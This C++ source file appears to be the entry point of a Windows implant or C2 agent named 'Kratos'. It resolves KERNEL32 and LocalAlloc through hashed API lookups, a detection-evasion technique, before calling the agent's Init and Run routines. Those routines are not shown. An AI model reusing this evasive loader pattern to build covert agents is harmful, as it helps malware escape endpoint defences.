#include "agent/core.h"



void Entry( ) {
#ifdef DEBUG
	AllocConsole( );
#endif
	HMODULE Kernel32 = api::GetModule( HASH_STRW( L"KERNEL32.DLL" ) );
	if ( ! Kernel32 ) {
		return;
	}

	auto LocalAllocFn = ( decltype( &LocalAlloc ) ) api::GetProcAddress( Kernel32, HASH_STRA( "LocalAlloc" ) );
	if ( ! LocalAllocFn ) {
		return;
	}

	Kratos* K = ( Kratos* ) LocalAllocFn( ALLOC_ARGS, sizeof( Kratos ) );
	if ( ! K ) {
		return;
	}

	kratos = K;

	DEBUG_LOG("[*] Kratos Started");

	if ( ! kratos->Init( ) ) {
		DEBUG_LOG( "[!] Failed With Kratos->Init" );
		return;
	}

	if ( ! kratos->Run( ) ) {
		DEBUG_LOG("[!] Failed Run");
		return;
	}
	

}

int main( ) {
	Entry( );
	return 0;
}